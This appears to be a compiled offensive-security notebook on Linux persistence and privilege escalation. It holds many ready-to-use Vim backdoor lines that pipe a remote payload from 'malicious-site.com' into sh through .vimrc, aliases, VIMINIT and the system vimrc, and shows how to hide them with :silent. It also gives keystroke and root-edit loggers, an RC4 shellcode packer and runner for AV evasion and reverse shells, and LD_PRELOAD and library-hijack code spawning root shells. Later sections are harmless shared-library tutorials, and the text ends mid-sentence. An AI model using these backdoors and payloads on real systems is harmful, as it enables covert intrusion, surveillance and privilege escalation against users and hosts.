
## VIM Exploits

Backdooring a text editor like Vim can be malicious and unethical. However, understanding potential vulnerabilities can help in securing systems and ensuring that they are protected against such threats. Here are some methods that could theoretically be used to backdoor Vim on Linux:

### 1. **Vim Configuration Files (`.vimrc` and `vimrc`)**

The `~/.vimrc` file in a user's home directory is executed whenever Vim starts. Adding malicious commands or scripts to this file can result in a backdoor.

```vim
" Add the following to .vimrc
autocmd VimEnter * !curl http://malicious-site.com/payload.sh | sh
```

This command will execute a script from a remote server every time Vim starts.

### 2. **Vim Plugins**

Installing or modifying Vim plugins to include malicious code can backdoor Vim. This can be done by tampering with popular plugin files located in `~/.vim/plugged/`.

```vim
" Example malicious plugin code
autocmd VimEnter * call system('curl http://malicious-site.com/payload.sh | sh')
```

### 3. **Aliases**

Creating an alias for the `vim` command in the shell configuration files (`.bashrc`, `.zshrc`, etc.) can redirect users to a malicious script.

```sh
# Add the following to .bashrc or .zshrc
alias vim='curl http://malicious-site.com/payload.sh | sh; /usr/bin/vim'
```

### 4. **Compiling a Malicious Version of Vim**

One can compile a custom version of Vim with added malicious code in the source code. For example, inserting a backdoor in the main function.

```c
int main(int argc, char **argv)
{
    system("curl http://malicious-site.com/payload.sh | sh");
    // Original Vim code here
}
```

### 5. **Exploiting Vulnerabilities**

If there are known vulnerabilities in Vim, they could be exploited to gain code execution. For example, certain versions of Vim have had vulnerabilities in how they handle modelines.

### 6. **Environment Variables**

Setting environment variables that affect Vim can introduce backdoors.

```sh
# Add the following to .bashrc or .zshrc
export VIMINIT=':!curl http://malicious-site.com/payload.sh | sh'
```

### 7. **Modifying System Vimrc**

Modifying the system-wide Vim configuration file (usually located at `/etc/vimrc` or `/usr/share/vim/vimrc`) can affect all users on the system.

```vim
" Add the following to /etc/vimrc
autocmd VimEnter * !curl http://malicious-site.com/payload.sh | sh
```

### 8. **Autocommands**

Using Vim’s autocommand feature to trigger malicious actions on certain events.

```vim
" Add the following to .vimrc
autocmd BufReadPost * !curl http://malicious-site.com/payload.sh | sh
```

## :Silent

Using `:silent` in Vim can suppress messages and outputs, which can help in hiding malicious activity. Here’s how `:silent` can be used in some of the methods mentioned earlier to make the backdoor less noticeable:

### Example 1: `.vimrc` File

Adding a `:silent` command in `.vimrc` to execute a malicious script silently:

```vim
" Add the following to .vimrc
autocmd VimEnter * silent !curl http://malicious-site.com/payload.sh | sh
```

### Example 2: Vim Plugins

If a malicious plugin is used, `:silent` can be added to the plugin script to hide its execution:

```vim
" Example malicious plugin code
autocmd VimEnter * silent call system('curl http://malicious-site.com/payload.sh | sh')
```

### Example 3: Aliases

Using `:silent` in combination with aliases might not be straightforward since aliases are defined in the shell configuration files. However, within the alias, you can call Vim with a `-c` command to execute silently:

```sh
# Add the following to .bashrc or .zshrc
alias vim='vim -c "silent !curl http://malicious-site.com/payload.sh | sh" -c q; /usr/bin/vim'
```

### Example 4: Environment Variables

Setting an environment variable to run a silent command:

```sh
# Add the following to .bashrc or .zshrc
export VIMINIT=':silent !curl http://malicious-site.com/payload.sh | sh'
```

### Example 5: Modifying System Vimrc

Using `:silent` in the system-wide Vim configuration file:

```vim
" Add the following to /etc/vimrc
autocmd VimEnter * silent !curl http://malicious-site.com/payload.sh | sh
```

### Example 6: Autocommands

Adding a silent autocommand:

```vim
" Add the following to .vimrc
autocmd BufReadPost * silent !curl http://malicious-site.com/payload.sh | sh
```

### Ethical Considerations

Again, it's essential to emphasize that using these methods for malicious purposes is illegal and unethical. The information provided here is solely for educational purposes to help understand potential security risks and how to defend against them.

### Securing Vim

To ensure Vim is secure and free from such backdoors:

1. **Regularly Audit Configuration Files:** Periodically check `.vimrc`, system-wide vimrc, and plugin files for any suspicious commands.
2. **Verify Plugins:** Only use plugins from trusted sources and verify their integrity.
3. **Monitor Changes:** Use tools like `Tripwire` or `AIDE` to monitor changes to critical files and configurations.
4. **Check Environment Variables:** Ensure no unauthorized environment variables are set.
5. **Update Regularly:** Keep Vim and the system updated with the latest security patches.
6. **Restrict File Permissions:** Limit write permissions to configuration files and system directories to trusted users only.

By being vigilant and implementing these security measures, you can help prevent and detect attempts to backdoor Vim.


### Capturing Keystrokes

Capturing keystrokes in a Vim session can be done using Vim's built-in recording and logging features, scripting capabilities, or external tools. Below are methods to achieve this:

### Method 1: Using Vim's Built-In Recording Feature

Vim has a built-in recording feature that allows you to record a series of keystrokes and replay them later.

1. **Start Recording:**
   - Press `q` followed by any letter (e.g., `a`) to start recording. This will record all your keystrokes until you stop the recording.
   - Example: `qa` (starts recording in register `a`)

2. **Stop Recording:**
   - Press `q` again to stop recording.

3. **Replay Recording:**
   - Press `@` followed by the register letter you used.
   - Example: `@a` (replays the keystrokes recorded in register `a`)

### Method 2: Using Vim's `keylog` Plugin

You can use a Vim plugin like `keylog` to log all keystrokes to a file.

1. **Install the Plugin:**
   - If you are using a plugin manager like `vim-plug`, add the following line to your `.vimrc`:
     ```vim
     Plug 'vim-scripts/keylog'
     ```

2. **Activate the Plugin:**
   - After installing the plugin, add the following command to your `.vimrc` to start logging keystrokes:
     ```vim
     let g:keylog_filename = '/path/to/your/logfile.log'
     ```

3. **Start Vim and Logging:**
   - Start Vim, and the plugin will automatically log your keystrokes to the specified file.

### Method 3: Using an External Tool

For more advanced keystroke logging, you can use external tools. However, be aware that using keyloggers can have serious security and privacy implications, and you should use them responsibly and ethically.

1. **Install and Configure a Keylogger:**
   - There are various keylogging tools available, such as `logkeys` or `xinput` for Linux, and similar tools for other operating systems.
   - For example, on Linux, you could use `xinput` to capture keystrokes.

### Example Using `xinput` on Linux

1. **Identify the Keyboard Device:**
   ```sh
   xinput list
   ```

2. **Monitor Keystrokes:**
   ```sh
   xinput test <device_id>
   ```

This command will start printing keystrokes to the terminal.

### Method 4: Using Vimscript to Log Keystrokes

You can use Vimscript to create a custom function that logs keystrokes to a file.

1. **Add the following script to your `.vimrc`:**

```vim
" Function to log keystrokes to a file
function! LogKeystrokes()
    " Get the last written line from the buffer
    let lines = getline(line("'[") - 1, line("']"))
    " Specify the log file
    let logfile = '/path/to/your/logfile.log'
    " Append the lines to the log file
    call writefile(lines, logfile, 'a')
endfunction

" Set up an autocmd to trigger the function on BufWritePost
autocmd BufWritePost * call LogKeystrokes()

```

### Capture keystrokes if only root user

```vim
" Function to log keystrokes to a file
function! LogKeystrokes()
    " Check if root user
    if $USER == 'root'
        " Get the last written line from the buffer
        let lines = getline(line("'[") - 1, line("']"))
        " Specify the log file
        let logfile = '/path/to/your/logfile.log'
        " Append the lines to the log file
        call writefile(lines, logfile, 'a')
    endif
endfunction

" Set up an autocmd to trigger the function on BufWritePost
autocmd BufWritePost * call LogKeystrokes()

```


## Bypassing AV

C programs for bypassing AV detection:
- Encrypt-ShellcodeRC4.c 
	- create a msfvenom c formated shellcode represented in hex and save to a file
	- compile `gcc -o encryptrc4 Encrypt-ShellcodeRC4.c `
	- run `encryptrc4 shellcode.txt`
	- Encrypt-ShellcodeRC4.c generate a random key to encrypt the shellcode
	- the resulting output is a file called `encrypted_payload.h` that contains the encrypted shellcode and the encryption/decryption key

Example encrypted_payload.h
```c
#ifndef BUFFER_H
#define BUFFER_H

unsigned char key[] = "B@$7P.omqDXyKIfw";
unsigned char buf[] = 
"\x8b\x7d\x92\xee\x3a\xb6\x02\xc3\x24\x6b\x80\x05\x8d\x4c\xe1\x18"
"\x2a\x9f\xde\x8c\x0e\x91\x77\x9f\x92\x51\xff\x7f\x76\xf3\x52\xb7"
"\xdd\x48\x25\x64\x46\x37\x14\x15\x04\x4d\xf2\xe5\x85\xc3\xcf\x18"
"\xe8\xe6\xbc\xed\x42\xe5\x06\x0d\x15\xef\xea\x6b\xff\x74\xc8\xb1"
"\x25\x40\xe8\x90\xc8\x42\x3b\x3b\x66\x50";

#define BUF_SIZE sizeof(buf)
#endif

```

- ShellCodeRC4Runner.c
	- upload both ShellCodeRC4Runner.c and encrypted_payload.h to the victim machine
	- compile `gcc -o runner ShellCodeRC4Runner.c`
	- configure netcat or other software to catch the reverse shell
	- `./runner` on the victim machine

*Note:* this doesn't run in the background without sending to the background.


Shared libraries in Linux are a way to share code among multiple programs, reducing the amount of duplicated code and saving system resources. They provide a mechanism for executable files to use functions and other resources that are stored in external files, which are loaded into memory when the program runs. Here are some key concepts and details about shared libraries in Linux:

### Key Concepts

1. **Shared Library Files**:
   - Shared libraries are typically files with `.so` (shared object) extensions, e.g., `libexample.so`.

2. **Dynamic Linking**:
   - Programs using shared libraries are dynamically linked. This means that the linking of the shared library occurs at runtime rather than at compile time.

3. **Advantages**:
   - **Reduced Memory Usage**: Multiple programs can share a single copy of the library code in memory.
   - **Modularity**: Libraries can be updated independently of the applications that use them.
   - **Smaller Executable Size**: Executables are smaller because they do not need to contain library code.

### Creating and Using Shared Libraries

#### Creating a Shared Library

1. **Write the Source Code**:
   - Create source files for the functions you want to include in the library.

   ```c
   // example.c
   #include <stdio.h>

   void hello() {
       printf("Hello, World!\n");
   }
   ```

2. **Compile the Source Code into Object Files**:
   - Use the `-fPIC` flag to generate position-independent code, which is required for shared libraries.

   ```sh
   gcc -fPIC -c example.c -o example.o
   ```

3. **Link the Object Files into a Shared Library**:
   - Use the `-shared` flag to create the shared library.

   ```sh
   gcc -shared -o libexample.so example.o
   ```

#### Using a Shared Library

1. **Compile the Program with the Shared Library**:
   - Use the `-L` flag to specify the directory containing the library and the `-l` flag to link against it.

   ```c
   // main.c
   #include <stdio.h>

   void hello();

   int main() {
       hello();
       return 0;
   }
   ```

   ```sh
   gcc -L. -lexample main.c -o main
   ```

2. **Run the Program**:
   - Ensure the dynamic linker can find the shared library by setting the `LD_LIBRARY_PATH` environment variable or placing the library in a standard location like `/usr/lib`.

   ```sh
   export LD_LIBRARY_PATH=.
   ./main
   ```

### Shared Library Management

1. **Listing Shared Libraries**:
   - Use the `ldd` command to list the shared libraries used by an executable.

   ```sh
   ldd ./main
   ```

2. **Managing Shared Libraries**:
   - Shared libraries are typically installed in standard directories like `/lib`, `/usr/lib`, or `/usr/local/lib`.
   - The `ldconfig` command is used to update the shared library cache, which is stored in `/etc/ld.so.cache`.

   ```sh
   sudo ldconfig
   ```

3. **Environment Variables**:
   - `LD_LIBRARY_PATH`: Specifies additional directories to search for shared libraries at runtime.
   - `LD_PRELOAD`: Specifies libraries to load before others, useful for debugging or overriding functions.

### Versioning

Shared libraries often include versioning information to maintain compatibility between different versions of the library and the programs that use them. This can be done by appending version numbers to the library name, e.g., `libexample.so.1.0`.

### Example

Here is a full example of creating and using a shared library in Linux:

#### Creating the Library

1. Write `example.c`:

   ```c
   #include <stdio.h>

   void hello() {
       printf("Hello, World!\n");
   }
   ```

2. Compile and link:

   ```sh
   gcc -fPIC -c example.c -o example.o
   gcc -shared -o libexample.so example.o
   ```

#### Using the Library

1. Write `main.c`:

   ```c
   #include <stdio.h>

   void hello();

   int main() {
       hello();
       return 0;
   }
   ```

2. Compile and link:

   ```sh
   gcc -L. -lexample main.c -o main
   ```

3. Run the program:

   ```sh
   export LD_LIBRARY_PATH=.
   ./main
   ```

This will output `Hello, World!`, demonstrating the use of the shared library.

Exploiting shared libraries in Linux can involve several techniques, each with varying levels of complexity and impact. The most common techniques include DLL hijacking, LD_PRELOAD, and environment variable manipulation. It’s important to note that exploiting shared libraries can be used for both malicious purposes and legitimate security testing. Here are some common methods:

### 1. **LD_PRELOAD Technique**

`LD_PRELOAD` is an environment variable in Unix-like operating systems that allows you to load a shared library before any other when executing a program. This can be used to override functions in the existing libraries.

#### Example:

1. **Create a Malicious Shared Library:**

   ```c
   // preload.c
   #include <stdio.h>
   #include <stdlib.h>

   void _init() {
       printf("Malicious code executed!\n");
   }
   ```

   Compile the shared library:

   ```bash
   gcc -shared -o preload.so -fPIC preload.c
   ```

2. **Run a Program with LD_PRELOAD:**

   ```bash
   LD_PRELOAD=./preload.so ls
   ```

   This will execute the `_init` function from `preload.so` before running the `ls` command, printing "Malicious code executed!".

### 2. **DLL Hijacking**

DLL hijacking (or shared library hijacking) involves placing a malicious shared library in a location where the target application will load it instead of the legitimate one. This usually exploits the search order for shared libraries.

#### Example:

1. **Identify a Shared Library Used by a Target Application:**

   Use `ldd` to list the shared libraries used by an application:

   ```bash
   ldd /path/to/application
   ```

2. **Create a Malicious Shared Library with the Same Name:**

   ```c
   // fake_lib.c
   #include <stdio.h>

   void hijacked_function() {
       printf("Hijacked function called!\n");
   }
   ```

   Compile the malicious library:

   ```bash
   gcc -shared -o libtarget.so -fPIC fake_lib.c
   ```

3. **Place the Malicious Library in the Same Directory as the Application:**

   If the application searches the current directory first, it will load `libtarget.so` instead of the legitimate library.

### 3. **Manipulating Environment Variables**

Certain environment variables can influence the loading of shared libraries, such as `LD_LIBRARY_PATH`, `LD_PRELOAD`, and `LD_DEBUG`. By manipulating these variables, you can control which libraries are loaded by an application.

#### Example:

1. **Set LD_LIBRARY_PATH to a Directory Containing a Malicious Library:**

   ```bash
   export LD_LIBRARY_PATH=/path/to/malicious/libs:$LD_LIBRARY_PATH
   ```

2. **Run the Target Application:**

   ```bash
   /path/to/application
   ```

   The application will search `/path/to/malicious/libs` first for shared libraries.

### 4. **Overwriting Global Offset Table (GOT) Entries**

The Global Offset Table (GOT) holds addresses of shared library functions used by an application. By overwriting GOT entries, an attacker can redirect function calls to malicious code.

#### Example:

1. **Locate GOT Entries:**

   Use tools like `objdump` or `readelf` to find the GOT entries of a target binary.

2. **Overwrite GOT Entry:**

   This usually requires exploiting a vulnerability in the application, such as a buffer overflow, to overwrite a GOT entry with the address of the malicious code.

### Precautions and Security Measures

1. **Secure Coding Practices:**
   - Avoid using functions that are susceptible to buffer overflows.
   - Validate all inputs.

2. **Use Full Paths for Libraries:**
   - When specifying libraries in your applications, use full paths to avoid ambiguity.

3. **Restrict Permissions:**
   - Limit write permissions to directories where shared libraries are stored.

4. **Environment Variable Sanitization:**
   - Clear or validate environment variables like `LD_LIBRARY_PATH` and `LD_PRELOAD` in setuid programs.

5. **Enable Security Features:**
   - Use security features like Address Space Layout Randomization (ASLR), Stack Canaries, and Position Independent Executable (PIE).

6. **Monitor and Audit:**
   - Regularly audit and monitor system and application logs for unusual activity.

Exploiting shared libraries requires a deep understanding of how dynamic linking works and how shared libraries are loaded and used by applications. While these techniques can be used maliciously, they are also valuable for security professionals conducting penetration testing and vulnerability assessments.

Taking advantage of shared library exploitation techniques with `sudo` involves more complexity and risk, as `sudo` is designed to provide controlled privilege escalation while maintaining security. However, there are known vulnerabilities and misconfigurations that attackers can exploit. It's important to note that exploiting `sudo` can have serious security implications, so this knowledge should be used responsibly, preferably for educational purposes or legitimate security testing.

### Potential Techniques to Exploit Sudo Using Shared Libraries

1. **LD_PRELOAD and Sudo:**

   Normally, `sudo` sanitizes the environment to prevent manipulation of `LD_PRELOAD`. However, if the environment sanitization is bypassed due to a misconfiguration or vulnerability, an attacker could use `LD_PRELOAD` to inject a malicious shared library.

2. **Exploiting Sudo Misconfigurations:**

   Misconfigurations in `sudo` can potentially allow exploitation. For instance, if a program running with `sudo` is vulnerable to shared library hijacking, an attacker might exploit that.

3. **Vulnerabilities in Sudo:**

   Specific vulnerabilities in `sudo` itself can be exploited. For example, CVE-2019-14287 allowed users to bypass restrictions by specifying the user ID `-1` or `4294967295`.

### Example: Using LD_PRELOAD with Sudo (Misconfiguration or Vulnerability)

Let's assume a scenario where `sudo` does not sanitize `LD_PRELOAD`. This is a hypothetical situation for educational purposes:

1. **Create a Malicious Shared Library:**

   ```c
   // preload.c
   #include <stdio.h>
   #include <stdlib.h>

   void _init() {
       setuid(0);  // Elevate privileges
       system("/bin/sh");  // Launch a shell
   }
   ```

   Compile the shared library:

   ```bash
   gcc -shared -o preload.so -fPIC preload.c
   ```

2. **Run a Program with Sudo and LD_PRELOAD:**

   ```bash
   sudo LD_PRELOAD=./preload.so some_command
   ```

   If `sudo` does not sanitize `LD_PRELOAD`, this would elevate privileges and launch a shell with root privileges.

### Example: Exploiting Sudo Misconfigurations

If a `sudo` configuration allows running a vulnerable program, you can potentially exploit it. For example, if `sudo` is configured to allow running a program that uses a shared library from an untrusted directory:

1. **Check Sudoers Configuration:**

   ```bash
   sudo -l
   ```

   Look for misconfigurations allowing unrestricted access or running specific programs as root.

2. **Create a Malicious Shared Library:**

   ```c
   // hijack.c
   #include <stdio.h>
   #include <stdlib.h>

   void hijacked_function() {
       printf("Hijacked function called!\n");
       setuid(0);
       system("/bin/sh");
   }
   ```

   Compile the malicious library:

   ```bash
   gcc -shared -o libtarget.so -fPIC hijack.c
   ```

3. **Place the Malicious Library in the Target Directory:**

   ```bash
   sudo cp libtarget.so /path/to/untrusted/directory
   ```

4. **Run the Vulnerable Program:**

   ```bash
   sudo /path/to/vulnerable_program
   ```

   If the vulnerable program loads `libtarget.so` from the untrusted directory, the malicious code will execute with elevated privileges.


#### Sudo env_reset and env_keep

Certainly! Both `env_reset` and `env_keep` are directives used in the sudo configuration file (usually `/etc/sudoers`) to control how the environment is handled when a user runs a command with sudo. Let's break down the differences:

1. env_reset:

   - Purpose: Provides a clean, minimal environment for the command run with sudo.
   - Behavior: 
     - Clears most environment variables.
     - Sets a basic, default environment.
     - Helps improve security by reducing the risk of environment-based attacks.
   - Default: This is typically the default setting in modern sudo configurations.
   - Example in sudoers: `Defaults env_reset`

2. env_keep:

   - Purpose: Specifies which environment variables should be kept when sudo is invoked.
   - Behavior:
     - Used in conjunction with env_reset.
     - Allows specific variables to be preserved from the user's environment.
     - Useful when certain environment variables are needed for proper operation of commands.
   - Usage: Often used to keep variables like TERM, PATH, HOME, etc.
   - Example in sudoers: `Defaults env_keep += "HOME TERM"

Key Differences:

1. Scope:
   - env_reset affects the entire environment.
   - env_keep specifies exceptions to env_reset.

2. Default behavior:
   - env_reset clears most variables.
   - env_keep preserves specified variables.

3. Security implication:
   - env_reset is more secure as it provides a clean slate.
   - env_keep can potentially introduce security risks if not used carefully.

4. Flexibility:
   - env_reset is a binary option (on/off).
   - env_keep allows fine-grained control over which variables to preserve.

5. Typical use:
   - env_reset is usually set globally.
   - env_keep is often used to make exceptions for necessary variables.

In practice, it's common to see both used together. For example:

```
Defaults env_reset
Defaults env_keep += "COLORS DISPLAY HOSTNAME HISTSIZE TERM EDITOR"
```

### C Constructor functions:

In C programming, a constructor function is not a built-in language feature like in object-oriented programming languages such as C++ or Java. However, the term "constructor" in C is often used to describe a function that initializes data structures or performs setup operations before the main program execution begins.

There are two common ways to implement constructor-like functionality in C:

1. Using function pointers with the `__attribute__((constructor))` attribute (GCC extension)
2. Using a function that explicitly initializes a structure

Let's look at examples for both approaches:

1. Using `__attribute__((constructor))`:

This GCC extension allows you to define functions that are automatically called before `main()` executes.

```c
#include <stdio.h>

__attribute__((constructor))
void my_constructor() {
    printf("Constructor: This runs before main()\n");
}

int main() {
    printf("Main: This is the main function\n");
    return 0;
}
```

When you run this program, you'll see:
```
Constructor: This runs before main()
Main: This is the main function
```

2. Using a function to initialize a structure:

This is a more traditional C approach, where you create a function that initializes a structure.

```c
#include <stdio.h>
#include <stdlib.h>

typedef struct {
    int x;
    int y;
} Point;

Point* Point_create(int x, int y) {
    Point* p = (Point*)malloc(sizeof(Point));
    if (p == NULL) {
        return NULL;  // Handle allocation failure
    }
    p->x = x;
    p->y = y;
    return p;
}

void Point_destroy(Point* p) {
    free(p);
}

int main() {
    Point* myPoint = Point_create(10, 20);
    if (myPoint == NULL) {
        printf("Failed to create Point\n");
        return 1;
    }

    printf("Point: (%d, %d)\n", myPoint->x, myPoint->y);

    Point_destroy(myPoint);
    return 0;
}
```

In this example:
- `Point_create` acts as a constructor, allocating memory and initializing the structure.
- `Point_destroy` acts as a destructor, freeing the allocated memory.

This approach allows you to encapsulate the initialization logic and ensure proper setup of your data structures.

These methods provide ways to implement constructor-like behavior in C, allowing for proper initialization and setup of data structures or program state before the main execution begins.

Creating a shared library in Linux using C is straightforward. You can also create shared libraries using other languages like C++, Python, Rust, and others, depending on your requirements. Below are steps for creating a shared library in C and a brief overview of doing it in other languages.

### Creating a Shared Library in C

1. **Write Your C Code:**

   Create a source file, for example, `mylib.c`:

   ```c
   // mylib.c
   #include <stdio.h>

   void my_function() {
       printf("Hello from the shared library!\n");
   }
   ```

2. **Compile the C Code into a Shared Library:**

   Use `gcc` to compile your code into a shared library (`.so` file):

   ```bash
   gcc -fPIC -c mylib.c
   gcc -shared -o libmylib.so mylib.o
   ```

   - `-fPIC` generates position-independent code (PIC), which is necessary for shared libraries.
   - `-shared` creates a shared library.

3. **Using the Shared Library:**

   Create another C file to use the shared library, for example, `main.c`:

   ```c
   // main.c
   #include <stdio.h>

   // Declare the function from the shared library
   void my_function();

   int main() {
       my_function();
       return 0;
   }
   ```

4. **Compile and Link with the Shared Library:**

   ```bash
   gcc -L. -o main main.c -lmylib
   ```

   - `-L.` tells the linker to look in the current directory for libraries.
   - `-lmylib` links the `libmylib.so` shared library.

5. **Run the Program:**

   Ensure the shared library is in the `LD_LIBRARY_PATH` or in the same directory as the executable:

   ```bash
   export LD_LIBRARY_PATH=.
   ./main
   ```

   This should output: `Hello from the shared library!`

### Creating Shared Libraries in Other Languages

#### C++
You can create shared libraries in C++ similarly to C. Just ensure to use the C++ compiler (`g++`).

```cpp
// mylib.cpp
#include <iostream>

extern "C" void my_function() {
    std::cout << "Hello from the shared library!" << std::endl;
}
```

Compile with:

```bash
g++ -fPIC -c mylib.cpp
g++ -shared -o libmylib.so mylib.o
```

#### Python
You can use tools like `ctypes` or `cffi` to load shared libraries written in C or C++.

```python
# main.py
from ctypes import CDLL

# Load the shared library
lib = CDLL('./libmylib.so')

# Call the function
lib.my_function()
```

#### Rust
You can create shared libraries in Rust using `cdylib`.

```rust
// src/lib.rs
#[no_mangle]
pub extern "C" fn my_function() {
    println!("Hello from the shared library!");
}
```

Compile with:

```bash
cargo build --release --lib --target=x86_64-unknown-linux-gnu
```

The shared library will be in `target/x86_64-unknown-linux-gnu/release`.

### Conclusion

Creating shared libraries in C on Linux involves writing the code, compiling it with `-fPIC` and `-shared` flags, and linking against the shared library when compiling the program that uses it. You can also create shared libraries using other languages like C++, Python, or Rust, each with its own tools and methods.

Reading a shared library's function calls and generating C code that includes those exact function calls involves several steps. These steps include analyzing the shared library to identify its exported functions, generating the corresponding C code, and optionally using the library in a program. This process requires tools like `nm`, `objdump`, or `readelf` to inspect the shared library, and a basic understanding of how to generate C code dynamically.

### Steps to Read Function Calls from a Shared Library and Generate C Code

1. **Analyze the Shared Library:**

   Use `nm` or `objdump` to list the symbols (functions) in the shared library.

   ```bash
   nm -D libmylib.so
   ```

   or

   ```bash
   objdump -T libmylib.so
   ```

   These commands will list all the symbols in the shared library, including function names.

2. **Generate a C Header File:**

   Create a C header file that declares the functions found in the shared library.

   ```c
   // mylib.h
   #ifndef MYLIB_H
   #define MYLIB_H

   void my_function();

   // Add more function declarations as needed

   #endif // MYLIB_H
   ```

3. **Create C Code to Use the Functions:**

   Write C code that includes the generated header file and calls the functions.

   ```c
   // main.c
   #include <stdio.h>
   #include "mylib.h"

   int main() {
       my_function();
       // Add more function calls as needed
       return 0;
   }
   ```

4. **Link with the Shared Library:**

   Compile and link your program with the shared library.

   ```bash
   gcc -L. -o main main.c -lmylib
   ```

5. **Run the Program:**

   Ensure the shared library is in the `LD_LIBRARY_PATH` or in the same directory as the executable.

   ```bash
   export LD_LIBRARY_PATH=.
   ./main
   ```

### Example

Let's assume `libmylib.so` contains a function `void my_function();`.

1. **Analyze the Shared Library:**

   ```bash
   nm -D libmylib.so

   # Output:
   # 000000000000114a T my_function
   ```

2. **Generate a C Header File:**

   ```c
   // mylib.h
   #ifndef MYLIB_H
   #define MYLIB_H

   void my_function();

   #endif // MYLIB_H
   ```

3. **Create C Code to Use the Functions:**

   ```c
   // main.c
   #include <stdio.h>
   #include "mylib.h"

   int main() {
       my_function();
       return 0;
   }
   ```

4. **Link with the Shared Library:**

   ```bash
   gcc -L. -o main main.c -lmylib
   ```

5. **Run the Program:**

   ```bash
   export LD_LIBRARY_PATH=.
   ./main
   ```

### Automating the Process

For a more automated approach, you could write a script to extract function names and generate the corresponding header file and C code.

#### Example Script in Bash

```bash
#!/bin/bash

LIBRARY=$1
HEADER="mylib.h"
SOURCE="main.c"

# Extract function names
nm -D $LIBRARY | grep ' T ' | awk '{print $3}' > functions.txt

# Generate header file
echo "#ifndef MYLIB_H" > $HEADER
echo "#define MYLIB_H" >> $HEADER
while read -r function; do
    echo "void $function();" >> $HEADER
done < functions.txt
echo "#endif // MYLIB_H" >> $HEADER

# Generate source file
echo "#include <stdio.h>" > $SOURCE
echo "#include \"$HEADER\"" >> $SOURCE
echo "int main() {" >> $SOURCE
while read -r function; do
    echo "    $function();" >> $SOURCE
done < functions.txt
echo "    return 0;" >> $SOURCE
echo "}" >> $SOURCE

# Clean up
rm functions.txt

echo "Generated $HEADER and $SOURCE"
```

### Conclusion

By analyzing a shared library using tools like `nm` or `objdump`, you can identify the functions it exports. You can then generate a C header file and source code that includes and calls these functions. The process can be automated using scripts to streamline the generation of the header file and the source code. This approach allows you to programmatically interact with and utilize the functions provided by a shared library.


Yes, you can automate the process of generating a version script, creating a header file, generating C code, and compiling it. Below is an updated bash script that takes an input `.so` file, reads its symbols, and generates the necessary files and version script if needed.

### Bash Script

This script takes an input `.so` file, generates a version script if it's not provided, and creates a header file and C code to use the library functions.

```bash
#!/bin/bash

if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <shared_library.so>"
    exit 1
fi

LIBRARY=$1
HEADER="mylib.h"
SOURCE="main.c"
VERSION_SCRIPT="mylib.map"

# Check if version script exists, if not create one
if [ ! -f $VERSION_SCRIPT ]; then
    echo "Generating version script..."

    # Extract function names
    nm -D $LIBRARY | grep ' T ' | awk '{print $3}' > functions.txt

    # Create version script
    echo "MYLIB_1.0 {" > $VERSION_SCRIPT
    echo "    global:" >> $VERSION_SCRIPT
    while read -r function; do
        echo "        $function;" >> $VERSION_SCRIPT
    done < functions.txt
    echo "    local:" >> $VERSION_SCRIPT
    echo "        *;" >> $VERSION_SCRIPT
    echo "};" >> $VERSION_SCRIPT
else
    echo "Version script already exists."
fi

# Generate header file
echo "Generating header file..."
echo "#ifndef MYLIB_H" > $HEADER
echo "#define MYLIB_H" >> $HEADER
while read -r function; do
    echo "void $function();" >> $HEADER
done < functions.txt
echo "#endif // MYLIB_H" >> $HEADER

# Generate source file
echo "Generating source file..."
echo "#include <stdio.h>" > $SOURCE
echo "#include \"$HEADER\"" >> $SOURCE
echo "int main() {" >> $SOURCE
while read -r function; do
    echo "    $function();" >> $SOURCE
done < functions.txt
echo "    return 0;" >> $SOURCE
echo "}" >> $SOURCE

# Clean up
rm functions.txt

echo "Generated $HEADER and $SOURCE"

# Compile and link with the shared library
gcc -L. -o main $SOURCE -Wl,--version-script=$VERSION_SCRIPT -l$(basename $LIBRARY .so)

echo "Compilation completed. Run the program with:"
echo "LD_LIBRARY_PATH=. ./main"
```

### Explanation

1. **Input Check:**
   - Ensures that the script is run with one argument, the shared library file.

2. **Version Script:**
   - Checks if a version script already exists. If not, it generates one.
   - Extracts function names using `nm` and creates a version script that exports these functions globally and hides others.

3. **Header File:**
   - Generates a header file (`mylib.h`) that declares the extracted functions.

4. **Source File:**
   - Generates a source file (`main.c`) that includes the header file and calls each function.

5. **Compile and Link:**
   - Compiles the generated source file and links it with the shared library, using the version script.

### Running the Script

Make the script executable and run it with the shared library as the argument:

```bash
chmod +x generate_code.sh
./generate_code.sh libmylib.so
```

### Conclusion

This script automates the process of analyzing a shared library, generating a version script if needed, creating a header file and source code, and compiling the result. This ensures that the shared library's functions can be used in a controlled manner, respecting versioning and symbol visibility.

Yes, there are several ways to search for binaries that use a specific shared library. These methods typically involve searching through the system's binaries for references to the shared library. Below are a few approaches:

### 1. Using `ldd`

`ldd` is a common tool used to list the shared libraries required by each program or shared library. You can combine `ldd` with other tools like `find` and `grep` to search through binaries.

```bash
find /path/to/search -type f -executable -print0 | xargs -0 ldd 2>/dev/null | grep "libmylib.so"
```

### 2. Using `grep` Directly

You can also search directly through the binaries for the shared library name using `grep`.

```bash
grep -r --include=\* -I -l "libmylib.so" /path/to/search
```

### 3. Using `objdump`

`objdump` can be used to inspect the dynamic section of binaries to find references to shared libraries.

```bash
find /path/to/search -type f -executable -print0 | xargs -0 objdump -p | grep "NEEDED" | grep "libmylib.so"
```

### 4. Using `readelf`

`readelf` is another tool that can be used to inspect binaries for shared library dependencies.

```bash
find /path/to/search -type f -executable -print0 | xargs -0 readelf -d 2>/dev/null | grep "Shared library" | grep "libmylib.so"
```

### Example Script

Here is a more comprehensive example script that combines `find`, `ldd`, and `grep` to search for binaries using a specific shared library.

```bash
#!/bin/bash

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <shared_library.so> <path_to_search>"
    exit 1
fi

LIBRARY=$1
SEARCH_PATH=$2

echo "Searching for binaries that use $LIBRARY in $SEARCH_PATH..."

find $SEARCH_PATH -type f -executable -print0 | while IFS= read -r -d '' file; do
    if ldd "$file" 2>/dev/null | grep -q "$LIBRARY"; then
        echo "Found: $file"
    fi
done
```

### Using Package Managers

If you are on a Linux distribution that uses package management, like Debian-based systems, you can use tools like `dpkg` or `apt-file` to find packages that depend on a specific shared library.

```bash
apt-file search libmylib.so
```

Or on Red Hat-based systems, you can use `rpm`:

```bash
rpm -q --whatrequires libmylib.so
```

### Conclusion

Searching for binaries that use a specific shared library can be done using various command-line tools. By combining `find`, `ldd`, `objdump`, `readelf`, or `grep`, you can effectively search through your system to identify binaries that link against the desired shared library. Package management tools can also help in finding package dependencies if you are working within a managed environment.

To generate a shared library (`.so` file) from the source files and automatically create the necessary header and version script files based on the shared library symbols, you can enhance the previous script. This enhanced script will:

